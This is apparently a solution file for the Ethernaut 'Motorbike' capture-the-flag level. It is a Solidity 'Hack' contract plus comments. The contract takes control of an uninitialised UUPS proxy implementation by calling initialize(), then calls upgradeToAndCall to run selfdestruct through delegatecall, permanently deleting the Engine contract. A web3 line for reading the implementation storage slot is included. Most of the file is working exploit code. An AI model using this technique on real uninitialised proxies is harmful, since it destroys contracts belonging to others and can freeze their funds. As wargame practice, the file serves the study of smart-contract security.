// SPDX-License-Identifier: MIT


pragma solidity ^0.8;

interface IMotorbike {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

// Get implementation
// await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// 0x000000000000000000000000c571f4be57f5bf5b33392bed742364a6855a7fe5

contract Hack {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

/*
goal is to kill engine 
we can gnore the proxy contract and just focus on implementation (Engine) contract

we get the engine contract address we check if the upgrader is assigned 
its not so we call initialize 

now upgrader is our hack contract 
now we can eacily call upgradeToAndCall and call the kill function as it uses delegate call 
it calls the kill on hack but actually deletes the engine contract



*/

